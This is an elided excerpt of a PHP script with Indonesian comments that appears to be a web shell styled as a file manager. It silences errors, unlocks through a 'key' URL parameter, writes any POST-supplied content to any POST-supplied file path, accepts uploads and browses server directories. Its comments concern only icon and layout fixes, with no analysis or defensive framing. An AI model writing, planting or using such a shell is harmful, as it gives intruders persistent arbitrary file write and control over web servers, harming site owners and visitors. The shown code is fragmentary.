 ...
 * Updated: April 2026
 * Perbaikan: Mengembalikan emoji sesuai referensi gambar & Path rapat.
 */
error_reporting(0);
...
if (isset($_POST['s'])) { if (file_put_contents($_POST['n'], $_POST['c']) !== false) $msg = "File Tersimpan!"; }
...
echo "<a href='$home_url' class='btn-home'>🏠 HOME</a>"; // Icon diperbaiki
...
foreach ($parts as $p) {
    ...
    echo "<a href='?key=$k&path=$accum'>$p</a>/"; // Path tanpa spasi
}
echo "</div></div>";
...
echo "<div class='toolbar'>
    ...
    <div class='card'><strong>📤 Upload</strong><form method='POST' enctype='multipart/form-data' style='display:flex; gap:5px;'><input type='file' name='u_file' style='flex:1'><button type='submit' class='btn' style='background:var(--green)'>Upload</button></form></div>
</div>";
...
foreach ($sorted_list as $i) {
    ...
    $isDir = is_dir($full);
    echo "<tr>";
    // Icon folder dan file diperbaiki
